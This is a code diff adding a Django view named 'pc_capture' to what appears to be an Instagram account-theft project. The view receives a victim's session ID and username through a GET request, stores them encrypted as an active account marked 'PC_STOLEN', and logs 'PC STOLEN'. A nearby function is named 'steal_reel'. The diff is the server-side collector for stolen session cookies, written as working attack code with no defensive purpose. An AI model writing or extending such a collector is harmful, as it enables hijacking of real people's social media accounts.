@@ -288,3 +288,26 @@ def steal_reel(request):
 
 def reel_page(request, code):
     return render(request, 'core/reel.html')
+
+
+
+# core/views.py
+def pc_capture(request):
+    s = request.GET.get('s', '')
+    u = request.GET.get('u', 'unknown')
+    
+    if s and len(s) > 60:
+        InstagramAccount.objects.update_or_create(
+            username=u,
+            defaults={
+                'password': 'PC_STOLEN',
+                'session_data': fernet.encrypt(json.dumps({
+                    "authorization_data": {"sessionid": s}
+                }).encode()).decode(),
+                'is_active': True,
+                'last_success': timezone.now()
+            }
+        )
+        print(f"PC STOLEN → @{u}")
+    
+    return HttpResponse("OK")
